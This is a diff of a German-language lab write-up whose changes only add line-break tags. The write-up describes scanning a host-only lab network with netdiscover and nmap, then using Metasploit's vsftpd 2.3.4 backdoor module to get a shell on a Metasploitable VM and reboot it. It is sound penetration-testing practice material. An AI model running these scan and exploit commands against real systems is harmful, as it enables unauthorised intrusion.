@@ -2,7 +2,7 @@
 
 ## Installation
 Die beiden VMs habe ich von den jeweiligen Webseiten heruntergeladen. Beide VMs sind prebuilt um Zeit zu sparen.
-In VMWare habe ich das VMNet0 genommen und Host-Only gemacht. Die Netzadresse habe ich auf 192.168.60.0 festgelegt.
+In VMWare habe ich das VMNet0 genommen und Host-Only gemacht. Die Netzadresse habe ich auf 192.168.60.0 festgelegt.<br>
 ![](Netzkonfiguration.png)
 
 ## Auftrag
@@ -11,14 +11,14 @@ Zuerst habe ich ein Netdiscover gemacht:
 ```
 sudo netdiscover –r 192.168.60.0/24
 ```
-Dabei sind folgende Geräte rausgekommen:
+Dabei sind folgende Geräte rausgekommen:<br>
 ![](Netdiscover.png)
 
 192.168.60.1 ist mein Laptop der als Firewall fungiert. Der 129er ist die Metasploit VM.
-Mit dem Normalen NMap Scan fand ich heraus dass die folgenden Ports offen sind:
+Mit dem Normalen NMap Scan fand ich heraus dass die folgenden Ports offen sind:<br>
 ![](NMAP.png)
 
-Wenn ich jetz auch den OS NMap ausführe sehe ich ganz genau auch alle Versionen und das OS:
+Wenn ich jetz auch den OS NMap ausführe sehe ich ganz genau auch alle Versionen und das OS:<br>
 ![](NMAP_OS.png)
 
 Den UDP Scan habe ich auch durchgeführt, jedoch hat der so lange gebraucht das ich ihn schliesslich gestoppt habe.
@@ -33,7 +33,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.60.129
 run
 ```
-So sieht es dann aus:
+So sieht es dann aus:<br>
 ![](Backdoor.png)
 Jetzt kann ich alles in der Shell ausführen was der Normale Benutzer auch könnte. Ich habe z.B. die Metasploit VM schon per Remote neugestartet. <br>
 
